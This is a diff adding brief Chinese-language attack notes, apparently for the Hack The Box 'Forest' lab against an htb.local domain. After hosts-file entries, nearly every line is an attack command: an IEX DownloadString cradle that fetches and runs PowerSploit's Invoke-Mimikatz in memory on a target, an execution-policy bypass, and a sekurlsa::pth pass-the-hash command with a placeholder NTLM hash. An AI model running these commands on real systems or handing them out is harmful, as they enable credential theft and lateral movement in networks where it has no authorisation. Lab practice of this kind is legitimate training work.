@@ -1,0 +1,20 @@
+>>> Host的Path:
+  C:\Windows\System32\drivers\etc
+>>> 最後加幾行:
+  10.129.95.210    htb.local
+  10.129.95.210    forest.htb.local
+  10.129.95.210    dc.htb.local
+  10.129.95.210    forest.htb
+>>> Powershell
+
+>>> 更新為powershell下載時用TLS1.2:
+  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+>>> 直接下載PowerSploit powershell版 Mimikatz raw 檔案（方便在目標機器上執行）：
+  IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerSp___/master/Invoke-Mimi____.ps1")
+
+>>> Set-ExecutionPolicy
+  Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+
+
+  Invoke-Mimikatz -Command '"sekurlsa::pth /user:使用者 /domain:htb.local /ntlm:NTLM_HASH /run:powershell.exe"'
